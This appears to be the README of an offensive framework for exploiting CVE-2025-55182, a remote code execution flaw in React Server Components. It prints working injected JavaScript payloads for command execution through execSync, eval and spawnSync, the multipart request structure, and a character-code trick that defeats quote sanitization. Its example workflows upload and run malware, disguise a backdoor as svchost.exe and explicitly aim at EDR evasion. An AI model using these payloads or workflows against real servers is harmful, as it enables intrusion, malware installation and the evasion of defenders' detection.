# exploit_tool - Modular CVE-2025-55182 Exploitation Framework

Modular interactive shell for CVE-2025-55182 (React Server Components RCE)

## Quick Start

```bash
python -m exploit_tool.main -t http://target.com
python -m exploit_tool.main -t http://target.com -T 30
```

---

## Architecture

```
exploit_tool/
├── main.py              # Entry point
├── shell.py             # InteractiveShell - command loop
├── engine.py            # ExploitEngine - HTTP requests & response parsing
├── payload_generator.py # PayloadGenerator - build exploit payloads
├── config.py            # ExploitConfig - target URL, timeout
├── theme.py             # Terminal colors
├── utils.py             # Helper functions (to_charcode)
└── commands/
    ├── builtin.py       # BuiltinCommands (help, info, history, timeout, eval, run)
    └── file_ops.py      # FileOperations (upload, decode, download)
```

**Flow:**

1. `main.py` → Parse args, create `InteractiveShell`
2. `shell.py` → Handle user input, dispatch to command handlers
3. `engine.py` → Build payload via `PayloadGenerator`, send HTTP request
4. `payload_generator.py` → Construct exploit payload (execSync/eval/spawnSync)
5. `engine.py` → Parse response header, decode base64 output

---

## Execution Modes

### 1. execSync (Default - spawns cmd.exe)

**Usage:** Any system command (default behavior)

```bash
rce #1 > whoami
rce #2 > dir
rce #3 > powershell -c Get-Process
```

**Payload:**

```javascript
process.mainModule.require("child_process").execSync("COMMAND");
```

**Injected Code:**

```javascript
var res = process.mainModule
  .require("child_process")
  .execSync("COMMAND")
  .toString();
var b64 = Buffer.from(res).toString("base64");
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`,
});
```

---

### 2. eval (NO spawn - pure Node.js)

**Usage:** `eval <javascript_code>`, `upload`, `decode`

```bash
rce #1 > eval process.cwd()
rce #2 > upload payload.b64
rce #3 > decode out.b64 file.exe
```

**Payload:**

```javascript
eval(String.fromCharCode(...))  // Executes in-process, NO child process
```

**Injected Code:**

```javascript
var res = eval("COMMAND");
var b64 = Buffer.from(String(res)).toString("base64");
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`,
});
```

**Note:** For `upload`/`decode`/`copyfile`, the command is wrapped in `eval(String.fromCharCode(...))` to avoid quotes.

**Implementation:**

- Uses `String.fromCharCode` to avoid quotes in payload
- Chunked upload (2000 chars/chunk) to bypass command line limits
- Direct `fs.writeFileSync` / `fs.appendFileSync` calls

---

### 3. spawnSync (NO cmd.exe - direct process spawn)

**Usage:** `run <executable> [args...]`

```bash
rce #1 > run malware.exe
rce #2 > run malware.exe arg1 arg2
```

**Payload:**

```javascript
child_process.spawnSync("executable", ["arg1", "arg2"], { shell: false });
```

**Injected Code:**

```javascript
var cp = process.mainModule.require("child_process");
var res = cp.spawnSync("executable", ["arg1", "arg2"], {
  shell: false,
  encoding: "utf8",
});
var output =
  (res.stdout ? res.stdout.toString() : "") +
  (res.stderr ? res.stderr.toString() : "");
var b64 = Buffer.from(output).toString("base64");
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`,
});
```

**Benefits:**

- Bypasses EDR rules targeting `cmd.exe` as child of `node.exe`
- Still spawns process (not as stealthy as `eval`)

---

## Commands

### File Operations (Stealth - NO spawn)

- `upload <file>` - Upload base64 file via eval (chunked, 2000 chars/chunk)
- `decode <in.b64> <out.file>` - Decode base64 via eval
- `copyfile <src> <dst>` - Copy file via eval (NO spawn)
- `rename <old> <new>` - Rename/move file via eval (NO spawn)
- `download <remote_file>` - Download file from target

### Built-in Commands

- `run <exe> [args]` - Execute via spawnSync (NO cmd.exe)
- `eval <js_code>` - Execute JavaScript via eval (NO spawn)
- `info` - System information
- `timeout [sec]` - Show/set request timeout
- `history` - Command history
- `help`, `clear`, `exit`

### Deprecated Commands (Case Study)

- `upload-echo` - [DEPRECATED] Via echo (spawns cmd.exe)
- `upload-node` - [DEPRECATED] Via Node.js (spawns node.exe)
- `decode-node` - [DEPRECATED] Via Node.js (spawns node.exe)

---

## Examples

### Stealth File Upload

```bash
# Local: Encode file (no line breaks for eval)
python encode_payload.py -l 0 malware.exe -o payload.b64

# Remote: Upload & decode
rce #1 > upload payload.b64
rce #2 > decode out.b64 malware.exe
rce #3 > run malware.exe
```

### EDR Evasion Workflow

```bash
# 1. System commands (spawns cmd.exe - detectable)
rce #1 > whoami
rce #2 > dir

# 2. File operations (NO spawn - stealth)
rce #3 > upload backdoor.b64
rce #4 > decode out.b64 backdoor.exe
rce #5 > copyfile backdoor.exe C:\Windows\Temp\svchost.exe
rce #6 > rename svchost.exe svchost_backup.exe

# 3. Execute executable (NO cmd.exe - stealth)
rce #5 > run backdoor.exe

# 4. Direct JavaScript execution (NO spawn - stealth)
rce #6 > eval process.mainModule.require('os').hostname()
```

---

## Technical Details

### String.fromCharCode Technique

**Problem:** `sanitize_command()` escapes quotes, breaking JSON payload structure.

**Solution:** Convert all strings to numeric character codes.

```python
def to_charcode(s):
    return ','.join(str(ord(c)) for c in s)

# 'fs' → String.fromCharCode(102,115)
# 'out.b64' → String.fromCharCode(111,117,116,46,98,54,52)
```

**Benefits:**

- Zero quoted strings in payload
- Bypasses `sanitize_command()` escaping
- Works with `eval()` and `spawnSync()` payloads

### Chunked Upload

Large files split into 2000-char chunks to avoid command line limits:

```python
chunk_size = 2000
chunks = [b64_content[i:i+chunk_size] for i in range(0, len(b64_content), chunk_size)]

# First chunk: writeFileSync
# Subsequent chunks: appendFileSync
```

### Payload Structure

```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data

Field 0: Malicious JSON with injected code
Field 1: Reference to Field 0 ($@0)
Field 2: Empty array []
```

**Injected Code Examples:**

**execSync mode:**

```javascript
var res = process.mainModule
  .require("child_process")
  .execSync("whoami")
  .toString();
var b64 = Buffer.from(res).toString("base64");
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`,
});
```

**eval mode:**

```javascript
var res=eval(String.fromCharCode(...));
var b64=Buffer.from(String(res)).toString('base64');
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`
});
```

**spawnSync mode:**

```javascript
var cp = process.mainModule.require("child_process");
var res = cp.spawnSync("malware.exe", ["arg1"], {
  shell: false,
  encoding: "utf8",
});
var output =
  (res.stdout ? res.stdout.toString() : "") +
  (res.stderr ? res.stderr.toString() : "");
var b64 = Buffer.from(output).toString("base64");
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${b64};307;`,
});
```

---

## Module Reference

### ExploitEngine

- `execute(command, use_eval=False, use_spawn=False)` - Execute command, return (success, status, output)
- `parse_response(response, silent=False)` - Extract base64 output from `X-Action-Redirect` header

### PayloadGenerator

- `build_exploit_payload(command, use_eval=False, use_spawn=False)` - Build exploit payload
- `sanitize_command(cmd)` - Escape quotes and backslashes
- `parse_command_for_spawn(command)` - Parse command into executable + args

### FileOperations

- `upload(filepath)` - Upload via eval (chunked, NO spawn)
- `decode(args)` - Decode base64 via eval (NO spawn)
- `copy(args)` - Copy file via eval (NO spawn)
- `rename(args)` - Rename/move file via eval (NO spawn)
- `download(remote_path)` - Download file from target

### BuiltinCommands

- `show_info()` - System information
- `set_timeout(args)` - Set request timeout
- `eval_js(args)` - Execute JavaScript via eval
- `show_history()` - Command history
